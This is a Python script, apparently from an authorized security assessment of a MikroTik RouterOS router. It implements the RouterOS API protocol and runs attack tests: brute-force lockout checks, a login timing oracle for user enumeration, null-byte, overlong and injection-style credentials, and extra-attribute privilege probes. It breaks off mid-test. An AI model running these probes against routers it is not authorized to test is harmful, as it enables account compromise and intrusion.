#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — RouterOS API Security Assessment
Phase 4: RouterOS API Protocol Attacks
Target: [REDACTED-INTERNAL-IP] (API port 8728, API-SSL port 8729)

Tests (~250):
  1. Protocol Implementation         (~40 tests)
  2. Authentication Attacks           (~40 tests)
  3. Command Injection                (~40 tests)
  4. Protocol-Level Attacks           (~50 tests)
  5. Pre-Auth Command Testing         (~30 tests)
  6. Post-Auth Privilege Testing      (~30 tests)
  7. Session / State Machine Abuse    (~20 tests)

Evidence: evidence/ros_api_attacks.json
"""

import hashlib
import json
import os
import socket
import ssl
import struct
import sys
import threading
import time
from datetime import datetime

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

# ── RouterOS API Protocol Encoder / Decoder ──────────────────────────────────

def encode_length(length):
    """Encode a word length using RouterOS API length encoding.

    Encoding scheme:
      0x00-0x7F       -> 1 byte
      0x80-0x3FFF     -> 2 bytes, high byte has 0x80 set
      0x4000-0x1FFFFF -> 3 bytes, high byte has 0xC0 set
      0x200000-0x0FFFFFFF -> 4 bytes, high byte has 0xE0 set
      >= 0x10000000   -> 5 bytes, first byte 0xF0 then 4 bytes
    """
    if length < 0:
        raise ValueError(f"Negative length: {length}")
    if length < 0x80:
        return bytes([length])
    elif length < 0x4000:
        length |= 0x8000
        return struct.pack("!H", length)
    elif length < 0x200000:
        length |= 0xC00000
        return struct.pack("!I", length)[1:]  # 3 bytes
    elif length < 0x10000000:
        length |= 0xE0000000
        return struct.pack("!I", length)
    else:
        return b'\xf0' + struct.pack("!I", length)


def decode_length(data):
    """Decode a RouterOS word length from raw bytes.

    Returns (length, bytes_consumed).
    """
    if len(data) < 1:
        raise ValueError("Empty data for length decode")

    b0 = data[0]

    if b0 < 0x80:
        return b0, 1
    elif b0 < 0xC0:
        if len(data) < 2:
            raise ValueError("Need 2 bytes for length")
        val = struct.unpack("!H", data[0:2])[0]
        return val & 0x3FFF, 2
    elif b0 < 0xE0:
        if len(data) < 3:
            raise ValueError("Need 3 bytes for length")
        val = struct.unpack("!I", b'\x00' + data[0:3])[0]
        return val & 0x1FFFFF, 3
    elif b0 < 0xF0:
        if len(data) < 4:
            raise ValueError("Need 4 bytes for length")
        val = struct.unpack("!I", data[0:4])[0]
        return val & 0x0FFFFFFF, 4
    elif b0 == 0xF0:
        if len(data) < 5:
            raise ValueError("Need 5 bytes for length")
        val = struct.unpack("!I", data[1:5])[0]
        return val, 5
    else:
        raise ValueError(f"Invalid length prefix byte: 0x{b0:02x}")


def encode_word(word):
    """Encode a single word: length-prefix + UTF-8 payload."""
    if isinstance(word, str):
        word = word.encode('utf-8')
    return encode_length(len(word)) + word


def decode_word(data):
    """Decode a single word from raw bytes.

    Returns (word_string, remaining_bytes).
    """
    length, consumed = decode_length(data)
    data = data[consumed:]
    if len(data) < length:
        raise ValueError(f"Need {length} bytes but only {len(data)} available")
    word = data[:length].decode('utf-8', errors='replace')
    return word, data[length:]


def encode_sentence(words):
    """Encode a list of word strings into a RouterOS sentence (terminated by 0x00)."""
    result = b''
    for w in words:
        result += encode_word(w)
    result += b'\x00'  # sentence terminator (zero-length word)
    return result


def decode_sentence(data):
    """Decode one sentence from raw bytes.

    Returns (list_of_words, remaining_bytes).
    """
    words = []
    while True:
        if len(data) == 0:
            break
        if data[0] == 0x00:
            data = data[1:]
            break
        word, data = decode_word(data)
        words.append(word)
    return words, data


def encode_raw_length(length_bytes):
    """Return raw bytes as a length prefix (for malformed length attacks)."""
    return length_bytes


# ── Raw Socket Helpers ───────────────────────────────────────────────────────

def raw_connect(port=8728, timeout=5):
    """Open a raw TCP socket to the RouterOS API port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((TARGET, port))
    return s


def raw_connect_ssl(port=8729, timeout=5):
    """Open a TLS-wrapped socket to the RouterOS API-SSL port."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(timeout)
    s = ctx.wrap_socket(raw, server_hostname=TARGET)
    s.connect((TARGET, port))
    return s


def send_sentence(sock, words):
    """Encode and send a sentence over a socket."""
    data = encode_sentence(words)
    sock.sendall(data)
    return data


def recv_sentence(sock, timeout=5):
    """Receive and decode a sentence from a socket.

    Returns list of words, or None on timeout/error.
    """
    sock.settimeout(timeout)
    buf = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            # Try to decode a complete sentence
            try:
                words, remaining = decode_sentence(buf)
                if words:  # non-empty sentence
                    return words
            except ValueError:
                continue  # need more data
    except socket.timeout:
        pass
    except Exception:
        pass

    # Try to decode whatever we have
    if buf:
        try:
            words, _ = decode_sentence(buf)
            return words if words else None
        except:
            return None
    return None


def recv_all_sentences(sock, timeout=3, max_sentences=20):
    """Receive multiple sentences until timeout. Returns list of word-lists."""
    sentences = []
    sock.settimeout(timeout)
    buf = b''
    deadline = time.time() + timeout
    try:
        while time.time() < deadline and len(sentences) < max_sentences:
            remaining_time = deadline - time.time()
            if remaining_time <= 0:
                break
            sock.settimeout(max(0.1, remaining_time))
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
            except socket.timeout:
                break

            # Decode as many sentences as possible from buffer
            while buf:
                try:
                    words, buf = decode_sentence(buf)
                    if words:
                        sentences.append(words)
                        if words[0] == '!done':
                            return sentences
                except ValueError:
                    break
    except:
        pass

    # Try remainder
    while buf:
        try:
            words, buf = decode_sentence(buf)
            if words:
                sentences.append(words)
        except:
            break

    return sentences


def api_login(sock, username, password):
    """Perform RouterOS API login on an existing socket.

    Returns (success_bool, response_words).
    """
    send_sentence(sock, ['/login', f'=name={username}', f'=password={password}'])
    resp = recv_sentence(sock, timeout=5)
    if resp and resp[0] == '!done':
        return True, resp
    return False, resp


def api_command(sock, command, attrs=None, queries=None, timeout=5):
    """Send a command sentence and receive all reply sentences.

    Returns list of sentence word-lists.
    """
    words = [command]
    if attrs:
        for k, v in attrs.items():
            words.append(f'={k}={v}')
    if queries:
        for q in queries:
            words.append(q)
    send_sentence(sock, words)
    return recv_all_sentences(sock, timeout=timeout)


def safe_close(sock):
    """Safely close a socket."""
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except:
        pass
    try:
        sock.close()
    except:
        pass


def sentence_summary(sentences):
    """Produce a short text summary of received sentences."""
    if not sentences:
        return "no_response"
    parts = []
    for s in sentences if isinstance(sentences[0], list) else [sentences]:
        if isinstance(s, list):
            parts.append(" ".join(s[:3]))
        else:
            parts.append(str(s))
    text = " | ".join(parts)
    return text[:500]


def words_summary(words):
    """Summarise a single word list."""
    if not words:
        return "no_response"
    return " ".join(words[:5])[:300]


# ── Health-check wrapper ─────────────────────────────────────────────────────

test_counter = 0

def health_gate(ev):
    """Call check_router_alive() every 10 tests. If dead, wait and record."""
    global test_counter
    test_counter += 1
    if test_counter % 10 == 0:
        status = check_router_alive()
        if not status.get("alive"):
            log("  Router not responding -- waiting...")
            status = wait_for_router(max_wait=60)
            if not status.get("alive"):
                ev.add_test("health", "health_gate",
                            "Router stopped responding during testing",
                            "DEAD", anomaly=True)
                ev.add_finding("HIGH", "Router crash during API testing",
                               "Router became unresponsive during API testing",
                               cwe="CWE-400")


# ══════════════════════════════════════════════════════════════════════════════
#  Category 1: Protocol Implementation (~40 tests)
# ══════════════════════════════════════════════════════════════════════════════

def test_protocol_implementation(ev):
    log("=" * 60)
    log("Category 1: Protocol Implementation")
    log("=" * 60)

    cat = "protocol_implementation"

    # ── 1.1  Encoder / Decoder unit tests ────────────────────────────────────
    # Verify our own encode/decode is consistent across all length tiers.
    boundaries = [
        (0, 1), (1, 1), (0x7F, 1),               # 1-byte tier
        (0x80, 2), (0x3FFF, 2),                    # 2-byte tier
        (0x4000, 3), (0x1FFFFF, 3),                # 3-byte tier
        (0x200000, 4), (0x0FFFFFFF, 4),            # 4-byte tier
        (0x10000000, 5), (0xFFFFFFFF, 5),          # 5-byte tier
    ]
    pass_count = 0
    fail_details = []
    for length, expected_bytes in boundaries:
        try:
            encoded = encode_length(length)
            decoded, consumed = decode_length(encoded)
            if decoded == length and consumed == expected_bytes:
                pass_count += 1
            else:
                fail_details.append(
                    f"len={length}: decoded={decoded}, consumed={consumed}, "
                    f"expected bytes={expected_bytes}")
        except Exception as e:
            fail_details.append(f"len={length}: exception {e}")

    ev.add_test(cat, "length_encode_decode_roundtrip",
                f"Round-trip encode/decode for {len(boundaries)} boundary values",
                f"{pass_count}/{len(boundaries)} passed",
                details={"failures": fail_details} if fail_details else None,
                anomaly=len(fail_details) > 0)

    # Word encode/decode
    test_words = ["", "a", "/login", "=name=admin", "?" + "A" * 200,
                  "x" * 127, "x" * 128, "x" * 16383, "x" * 16384]
    word_pass = 0
    word_fail = []
    for w in test_words:
        try:
            enc = encode_word(w)
            dec, rem = decode_word(enc)
            if dec == w and rem == b'':
                word_pass += 1
            else:
                word_fail.append(f"word len={len(w)}: mismatch")
        except Exception as e:
            word_fail.append(f"word len={len(w)}: {e}")

    ev.add_test(cat, "word_encode_decode_roundtrip",
                f"Round-trip encode/decode for {len(test_words)} words",
                f"{word_pass}/{len(test_words)} passed",
                details={"failures": word_fail} if word_fail else None,
                anomaly=len(word_fail) > 0)

    # Sentence encode/decode
    test_sentences = [
        ["/login", "=name=admin", "=password=test"],
        ["/system/resource/print"],
        ["!done"],
        ["!trap", "=message=error occurred"],
    ]
    sent_pass = 0
    for s in test_sentences:
        try:
            enc = encode_sentence(s)
            dec, rem = decode_sentence(enc)
            if dec == s:
                sent_pass += 1
        except:
            pass

    ev.add_test(cat, "sentence_encode_decode_roundtrip",
                f"Round-trip for {len(test_sentences)} sentences",
                f"{sent_pass}/{len(test_sentences)} passed")

    # ── 1.2  Login on port 8728 (plaintext API) ─────────────────────────────
    try:
        s = raw_connect(8728)
        ok, resp = api_login(s, ADMIN_USER, ADMIN_PASS)
        ev.add_test(cat, "login_api_8728",
                    "Login to API port 8728 with admin credentials",
                    "success" if ok else "failed",
                    details={"response": words_summary(resp)},
                    anomaly=not ok)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "login_api_8728",
                    "Login to API port 8728",
                    f"error: {e}", anomaly=True)

    health_gate(ev)

    # ── 1.3  Login on port 8729 (API-SSL) ───────────────────────────────────
    try:
        s = raw_connect_ssl(8729)
        ok, resp = api_login(s, ADMIN_USER, ADMIN_PASS)
        ev.add_test(cat, "login_api_ssl_8729",
                    "Login to API-SSL port 8729 with admin credentials",
                    "success" if ok else "failed",
                    details={"response": words_summary(resp)},
                    anomaly=not ok)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "login_api_ssl_8729",
                    "Login to API-SSL port 8729",
                    f"error: {e}", anomaly=True)

    # ── 1.4  Login with each test user ───────────────────────────────────────
    for username, info in USERS.items():
        try:
            s = raw_connect(8728)
            ok, resp = api_login(s, username, info["password"])
            ev.add_test(cat, f"login_user_{username}",
                        f"Login as {username} (group={info['group']})",
                        "success" if ok else "failed",
                        details={"response": words_summary(resp)},
                        anomaly=not ok)
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"login_user_{username}",
                        f"Login as {username}",
                        f"error: {e}", anomaly=True)

    health_gate(ev)

    # ── 1.5  Basic command execution after login ─────────────────────────────
    basic_cmds = [
        ("/system/resource/print", "Get system resource info"),
        ("/system/identity/print", "Get system identity"),
        ("/system/routerboard/print", "Get routerboard info"),
        ("/user/print", "List users"),
        ("/ip/address/print", "List IP addresses"),
        ("/interface/print", "List interfaces"),
        ("/system/package/print", "List packages"),
        ("/log/print", "Read system log"),
    ]
    try:
        s = raw_connect(8728)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            for cmd, desc in basic_cmds:
                try:
                    replies = api_command(s, cmd, timeout=5)
                    got_data = any(r[0] in ('!re', '!done') for r in replies if r)
                    ev.add_test(cat, f"cmd_{cmd.replace('/', '_').strip('_')}",
                                desc,
                                "data_received" if got_data else "no_data",
                                details={"reply_count": len(replies),
                                         "first": sentence_summary(replies[:1])})
                except Exception as e:
                    ev.add_test(cat, f"cmd_{cmd.replace('/', '_').strip('_')}",
                                desc, f"error: {e}", anomaly=True)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "basic_commands",
                    "Basic command execution after login",
                    f"connection error: {e}", anomaly=True)

    health_gate(ev)

    # ── 1.6  API version/feature negotiation ─────────────────────────────────
    # RouterOS 7+ may support enhanced login with challenge-response
    try:
        s = raw_connect(8728)
        # Try old-style login (just /login with no attrs to see what comes back)
        send_sentence(s, ['/login'])
        resp = recv_sentence(s, timeout=5)
        ev.add_test(cat, "login_no_credentials",
                    "Send /login with no attributes (probe challenge-response)",
                    words_summary(resp),
                    details={"response": words_summary(resp)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "login_no_credentials",
                    "Probe login challenge-response",
                    f"error: {e}")

    # ── 1.7  Cleartext credential observation on port 8728 ──────────────────
    # The plaintext API port sends credentials in the clear
    ev.add_test(cat, "cleartext_api_credentials",
                "API port 8728 transmits credentials in cleartext (no TLS)",
                "confirmed_cleartext",
                details={"port": 8728, "protocol": "RouterOS API (plaintext)",
                         "note": "Credentials sent as =name=... =password=... in cleartext"})
    ev.add_finding("HIGH",
                   "Cleartext credential transmission on API port 8728",
                   "The RouterOS API on port 8728 transmits login credentials "
                   "(=name=, =password= attributes) over an unencrypted TCP connection. "
                   "An attacker with network access can sniff credentials.",
                   cwe="CWE-319",
                   evidence_refs=["login_api_8728"])

    # ── 1.8  SSL certificate inspection on 8729 ─────────────────────────────
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(5)
        wrapped = ctx.wrap_socket(raw, server_hostname=TARGET)
        wrapped.connect((TARGET, 8729))
        cert = wrapped.getpeercert(binary_form=True)
        cipher = wrapped.cipher()
        protocol = wrapped.version()
        cert_info = {
            "cipher": cipher,
            "protocol": protocol,
            "cert_length": len(cert) if cert else 0,
        }
        # Try to get more cert details
        try:
            peer_cert = wrapped.getpeercert()
            if peer_cert:
                cert_info["subject"] = str(peer_cert.get("subject"))
                cert_info["issuer"] = str(peer_cert.get("issuer"))
                cert_info["notAfter"] = peer_cert.get("notAfter")
        except:
            pass
        ev.add_test(cat, "ssl_cert_inspection",
                    "Inspect TLS certificate and cipher on API-SSL port 8729",
                    f"TLS {protocol}, cipher={cipher[0] if cipher else 'unknown'}",
                    details=cert_info)
        safe_close(wrapped)
    except Exception as e:
        ev.add_test(cat, "ssl_cert_inspection",
                    "TLS inspection on 8729", f"error: {e}", anomaly=True)

    # ── 1.9  Simultaneous connections ────────────────────────────────────────
    try:
        sockets = []
        for i in range(5):
            s = raw_connect(8728, timeout=3)
            ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
            if ok:
                sockets.append(s)
        # Issue command on each
        working = 0
        for s in sockets:
            try:
                replies = api_command(s, "/system/identity/print", timeout=3)
                if replies:
                    working += 1
            except:
                pass
        ev.add_test(cat, "simultaneous_connections",
                    "5 simultaneous authenticated API sessions",
                    f"{working}/5 working",
                    details={"opened": len(sockets), "working": working})
        for s in sockets:
            safe_close(s)
    except Exception as e:
        ev.add_test(cat, "simultaneous_connections",
                    "Simultaneous API connections",
                    f"error: {e}", anomaly=True)

    health_gate(ev)

    # ── 1.10  Long-running session keepalive ─────────────────────────────────
    try:
        s = raw_connect(8728)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Send empty sentence (keepalive)
            s.sendall(b'\x00')
            time.sleep(1)
            replies = api_command(s, "/system/identity/print", timeout=3)
            still_alive = bool(replies)
            ev.add_test(cat, "keepalive_empty_sentence",
                        "Session survives empty sentence (keepalive)",
                        "session_alive" if still_alive else "session_dead",
                        details={"response": sentence_summary(replies)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "keepalive_empty_sentence",
                    "Keepalive test", f"error: {e}")

    # ── 1.11  API error message format inspection ────────────────────────────
    try:
        s = raw_connect(8728)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Send invalid command to see error format
            replies = api_command(s, "/nonexistent/command/path", timeout=3)
            reply_text = sentence_summary(replies)
            # Extract error attributes
            error_attrs = {}
            for r in replies:
                if r and r[0] == '!trap':
                    for w in r[1:]:
                        if '=' in w[1:]:
                            k, v = w[1:].split('=', 1)
                            error_attrs[k] = v
            ev.add_test(cat, "error_message_format",
                        "Inspect error response format for invalid command",
                        f"error_attrs: {list(error_attrs.keys())}",
                        details={"error_attributes": error_attrs,
                                 "full_response": reply_text[:200]})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "error_message_format",
                    "Error format inspection", f"error: {e}")

    # ── 1.12  Tag-based command tracking ─────────────────────────────────────
    try:
        s = raw_connect(8728)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Send 3 tagged commands
            for i in range(3):
                send_sentence(s, ["/system/identity/print", f".tag=test{i}"])
            replies = recv_all_sentences(s, timeout=5, max_sentences=10)
            tags_received = []
            for r in replies:
                for w in r:
                    if w.startswith(".tag="):
                        tags_received.append(w)
            ev.add_test(cat, "tag_tracking",
                        "Send 3 tagged commands, verify tag in replies",
                        f"tags_received: {tags_received}",
                        details={"expected_tags": ["test0", "test1", "test2"],
                                 "received_tags": tags_received})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "tag_tracking",
                    "Tag tracking test", f"error: {e}")

    # ── 1.13  Response to /system/resource/print: extract version info ───────
    try:
        s = raw_connect(8728)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            replies = api_command(s, "/system/resource/print", timeout=5)
            resource_data = {}
            for r in replies:
                if r and r[0] == '!re':
                    for w in r[1:]:
                        if w.startswith('=') and '=' in w[1:]:
                            k, v = w[1:].split('=', 1)
                            resource_data[k] = v
            ev.add_test(cat, "system_resource_via_api",
                        "Extract full system resource data via API",
                        f"version={resource_data.get('version', 'N/A')}, "
                        f"arch={resource_data.get('architecture-name', 'N/A')}",
                        details=resource_data)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "system_resource_via_api",
                    "System resource via API", f"error: {e}")

    # ── 1.14  /system/resource/print via SSL vs plaintext comparison ─────────
    try:
        # Plaintext
        s1 = raw_connect(8728)
        ok1, _ = api_login(s1, ADMIN_USER, ADMIN_PASS)
        plain_data = {}
        if ok1:
            replies = api_command(s1, "/system/resource/print", timeout=5)
            for r in replies:
                if r and r[0] == '!re':
                    for w in r[1:]:
                        if w.startswith('=') and '=' in w[1:]:
                            k, v = w[1:].split('=', 1)
                            plain_data[k] = v
        safe_close(s1)

        # SSL
        s2 = raw_connect_ssl(8729)
        ok2, _ = api_login(s2, ADMIN_USER, ADMIN_PASS)
        ssl_data = {}
        if ok2:
            replies = api_command(s2, "/system/resource/print", timeout=5)
            for r in replies:
                if r and r[0] == '!re':
                    for w in r[1:]:
                        if w.startswith('=') and '=' in w[1:]:
                            k, v = w[1:].split('=', 1)
                            ssl_data[k] = v
        safe_close(s2)

        match = plain_data.get("version") == ssl_data.get("version")
        ev.add_test(cat, "plaintext_vs_ssl_consistency",
                    "Compare resource output: plaintext 8728 vs SSL 8729",
                    f"consistent={match}",
                    details={"plain_version": plain_data.get("version"),
                             "ssl_version": ssl_data.get("version")})
    except Exception as e:
        ev.add_test(cat, "plaintext_vs_ssl_consistency",
                    "Plaintext vs SSL comparison", f"error: {e}")

    # ── 1.15  Query syntax validation ────────────────────────────────────────
    query_tests = [
        ("basic_query", ["/user/print", f"?name={ADMIN_USER}"],
         "Basic query: ?name=admin"),
        ("negation_query", ["/user/print", "?name=nonexistent", "?#!"],
         "Negation query: ?#!"),
        ("comparison_query", ["/ip/address/print", "?>address=0.0.0.0"],
         "Comparison query: ?>address"),
        ("has_query", ["/interface/print", "?#name"],
         "Has-property query: ?#name"),
    ]
    for name, words, desc in query_tests:
        try:
            s = raw_connect(8728)
            ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
            if ok:
                send_sentence(s, words)
                replies = recv_all_sentences(s, timeout=3)
                reply_text = sentence_summary(replies)
                ev.add_test(cat, f"query_{name}", desc,
                            f"response: {reply_text[:100]}",
                            details={"words": words})
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"query_{name}", desc, f"error: {e}")

    # ── 1.16  .proplist usage ────────────────────────────────────────────────
    try:
        s = raw_connect(8728)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            send_sentence(s, ["/system/resource/print",
                              "=.proplist=version,uptime,cpu-load"])
            replies = recv_all_sentences(s, timeout=3)
            reply_text = sentence_summary(replies)
            ev.add_test(cat, "proplist_filter",
                        "Use .proplist to filter returned attributes",
                        f"response: {reply_text[:100]}",
                        details={"response": reply_text[:300]})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "proplist_filter",
                    ".proplist filter test", f"error: {e}")

    health_gate(ev)


# ══════════════════════════════════════════════════════════════════════════════
#  Category 2: Authentication Attacks (~40 tests)
# ══════════════════════════════════════════════════════════════════════════════

def test_authentication_attacks(ev):
    log("=" * 60)
    log("Category 2: Authentication Attacks")
    log("=" * 60)

    cat = "authentication"

    # ── 2.1  Brute-force lockout testing (20 rapid failures) ─────────────────
    lockout_results = []
    for i in range(20):
        try:
            s = raw_connect(8728, timeout=3)
            ok, resp = api_login(s, "admin", f"WrongPass{i}")
            lockout_results.append({
                "attempt": i + 1,
                "success": ok,
                "response": words_summary(resp)
            })
            safe_close(s)
        except Exception as e:
            lockout_results.append({"attempt": i + 1, "error": str(e)})

    # Check if later attempts were blocked
    blocked = sum(1 for r in lockout_results if "error" in r or
                  (r.get("response") and "locked" in r.get("response", "").lower()))
    ev.add_test(cat, "bruteforce_lockout_20_attempts",
                "20 rapid login failures to test account lockout",
                f"{blocked}/20 blocked" if blocked else "no_lockout_detected",
                details={"results_sample": lockout_results[:5] + lockout_results[-3:]},
                anomaly=blocked == 0)

    if blocked == 0:
        ev.add_finding("MEDIUM",
                       "No account lockout on RouterOS API after 20 failed logins",
                       "The RouterOS API port 8728 does not enforce account lockout "
                       "after 20 consecutive failed login attempts with wrong passwords. "
                       "This enables brute-force attacks.",
                       cwe="CWE-307",
                       evidence_refs=["bruteforce_lockout_20_attempts"])

    health_gate(ev)
    # Brief pause to avoid any delayed lockout interfering with timing tests
    time.sleep(3)

    # ── 2.2  Timing oracle: valid user vs invalid user ───────────────────────
    valid_times = []
    invalid_times = []

    for i in range(50):
        # Valid user, wrong password
        try:
            s = raw_connect(8728, timeout=5)
            t0 = time.perf_counter()
            ok, resp = api_login(s, "admin", "WrongPassword")
            t1 = time.perf_counter()
            valid_times.append(t1 - t0)
            safe_close(s)
        except:
            pass

        # Invalid user
        try:
            s = raw_connect(8728, timeout=5)
            t0 = time.perf_counter()
            ok, resp = api_login(s, f"nonexistent_user_{i}", "WrongPassword")
            t1 = time.perf_counter()
            invalid_times.append(t1 - t0)
            safe_close(s)
        except:
            pass

        # Small delay to avoid flooding
        if i % 10 == 9:
            time.sleep(0.5)

    health_gate(ev)

    if valid_times and invalid_times:
        avg_valid = sum(valid_times) / len(valid_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        diff_ms = abs(avg_valid - avg_invalid) * 1000
        is_oracle = diff_ms > 5.0  # 5ms threshold

        ev.add_test(cat, "timing_oracle_user_enumeration",
                    "50 attempts each: valid user+wrong pw vs invalid user",
                    f"delta={diff_ms:.1f}ms (valid={avg_valid*1000:.1f}ms, "
                    f"invalid={avg_invalid*1000:.1f}ms)",
                    details={
                        "valid_user_avg_ms": round(avg_valid * 1000, 2),
                        "invalid_user_avg_ms": round(avg_invalid * 1000, 2),
                        "delta_ms": round(diff_ms, 2),
                        "samples_valid": len(valid_times),
                        "samples_invalid": len(invalid_times),
                    },
                    anomaly=is_oracle)

        if is_oracle:
            ev.add_finding("LOW",
                           f"Login timing oracle ({diff_ms:.1f}ms) enables user enumeration",
                           f"Average response time for valid username with wrong password: "
                           f"{avg_valid*1000:.1f}ms vs invalid username: {avg_invalid*1000:.1f}ms "
                           f"(delta={diff_ms:.1f}ms). Attackers can enumerate valid usernames.",
                           cwe="CWE-208",
                           evidence_refs=["timing_oracle_user_enumeration"])
    else:
        ev.add_test(cat, "timing_oracle_user_enumeration",
                    "Timing oracle test",
                    "insufficient_data",
                    details={"valid_samples": len(valid_times),
                             "invalid_samples": len(invalid_times)})

    # ── 2.3  Empty credentials ───────────────────────────────────────────────
    empty_cred_tests = [
        ("empty_username", "", ADMIN_PASS, "Empty username, valid password"),
        ("empty_password", ADMIN_USER, "", "Valid username, empty password"),
        ("both_empty", "", "", "Both username and password empty"),
    ]
    for name, user, passwd, desc in empty_cred_tests:
        try:
            s = raw_connect(8728, timeout=3)
            ok, resp = api_login(s, user, passwd)
            ev.add_test(cat, f"auth_{name}", desc,
                        "login_success" if ok else f"rejected: {words_summary(resp)}",
                        anomaly=ok)
            if ok:
                ev.add_finding("CRITICAL",
                               f"Authentication bypass: {desc}",
                               f"Login succeeded with {desc}",
                               cwe="CWE-287")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"auth_{name}", desc, f"error: {e}")

    # ── 2.4  Null bytes in credentials ───────────────────────────────────────
    null_tests = [
        ("null_in_username", "admin\x00root", ADMIN_PASS,
         "Null byte in username (admin\\x00root)"),
        ("null_in_password", ADMIN_USER, "TestPass123\x00extra",
         "Null byte in password (truncation test)"),
        ("null_prefix_user", "\x00admin", ADMIN_PASS,
         "Null byte prefix in username"),
        ("null_prefix_pass", ADMIN_USER, "\x00TestPass123",
         "Null byte prefix in password"),
    ]
    for name, user, passwd, desc in null_tests:
        try:
            s = raw_connect(8728, timeout=3)
            ok, resp = api_login(s, user, passwd)
            ev.add_test(cat, f"auth_{name}", desc,
                        "login_success" if ok else f"rejected: {words_summary(resp)}",
                        details={"user_repr": repr(user), "pass_repr": repr(passwd)},
                        anomaly=ok)
            if ok:
                ev.add_finding("HIGH",
                               f"Null byte auth bypass: {desc}",
                               f"Login succeeded with null bytes: user={repr(user)}",
                               cwe="CWE-626")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"auth_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 2.5  Very long username / password ───────────────────────────────────
    long_tests = [
        ("long_user_1kb", "A" * 1024, ADMIN_PASS, "1KB username"),
        ("long_user_10kb", "A" * 10240, ADMIN_PASS, "10KB username"),
        ("long_pass_1kb", ADMIN_USER, "A" * 1024, "1KB password"),
        ("long_pass_10kb", ADMIN_USER, "A" * 10240, "10KB password"),
        ("long_both_1kb", "A" * 1024, "A" * 1024, "1KB username + 1KB password"),
    ]
    for name, user, passwd, desc in long_tests:
        try:
            s = raw_connect(8728, timeout=5)
            ok, resp = api_login(s, user, passwd)
            ev.add_test(cat, f"auth_{name}", desc,
                        "login_success" if ok else f"rejected: {words_summary(resp)}",
                        anomaly=ok)
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"auth_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 2.6  Special characters in credentials ───────────────────────────────
    special_chars = [
        ("sql_injection", "admin' OR '1'='1", "' OR '1'='1"),
        ("backslash", "admin\\", "pass\\word"),
        ("unicode_homoglyph", "\u0430dmin", ADMIN_PASS),  # Cyrillic 'a'
        ("percent_encoding", "admin%00", "TestPass123%00"),
        ("equals_in_value", "admin=extra", "pass=word"),
        ("newline_in_user", "admin\nroot", ADMIN_PASS),
        ("tab_in_user", "admin\troot", ADMIN_PASS),
        ("cr_in_user", "admin\rroot", ADMIN_PASS),
    ]
    for name, user, passwd, *_ in special_chars:
        desc = f"Special chars in credentials: {name}"
        try:
            s = raw_connect(8728, timeout=3)
            ok, resp = api_login(s, user, passwd)
            ev.add_test(cat, f"auth_special_{name}", desc,
                        "login_success" if ok else f"rejected: {words_summary(resp)}",
                        details={"user_repr": repr(user)},
                        anomaly=ok)
            if ok:
                ev.add_finding("HIGH",
                               f"Authentication bypass with special chars: {name}",
                               f"Login succeeded with {name}: user={repr(user)}",
                               cwe="CWE-287")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"auth_special_{name}", desc, f"error: {e}")

    # ── 2.7  Login without password attribute ────────────────────────────────
    try:
        s = raw_connect(8728, timeout=3)
        send_sentence(s, ['/login', '=name=admin'])
        resp = recv_sentence(s, timeout=3)
        ok = resp and resp[0] == '!done'
        ev.add_test(cat, "auth_no_password_attr",
                    "Login with name but no password attribute",
                    "login_success" if ok else f"rejected: {words_summary(resp)}",
                    anomaly=ok)
        if ok:
            ev.add_finding("CRITICAL",
                           "Login without password attribute succeeds",
                           "Sending /login with =name= but no =password= succeeds",
                           cwe="CWE-287")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "auth_no_password_attr",
                    "Login without password", f"error: {e}")

    # ── 2.8  Login with extra unexpected attributes ──────────────────────────
    extra_attr_tests = [
        ("extra_group", ['=group=full'], "Extra =group=full attribute"),
        ("extra_admin", ['=admin=true'], "Extra =admin=true attribute"),
        ("extra_disabled", ['=disabled=no'], "Extra =disabled=no attribute"),
        ("extra_policy", ['=policy=full,read,write'], "Extra =policy= attribute"),
        ("extra_unknown", ['=xyzzy=12345'], "Unknown extra attribute"),
    ]
    for name, extra_attrs, desc in extra_attr_tests:
        try:
            s = raw_connect(8728, timeout=3)
            words = ['/login', f'=name={ADMIN_USER}',
                     f'=password={ADMIN_PASS}'] + extra_attrs
            send_sentence(s, words)
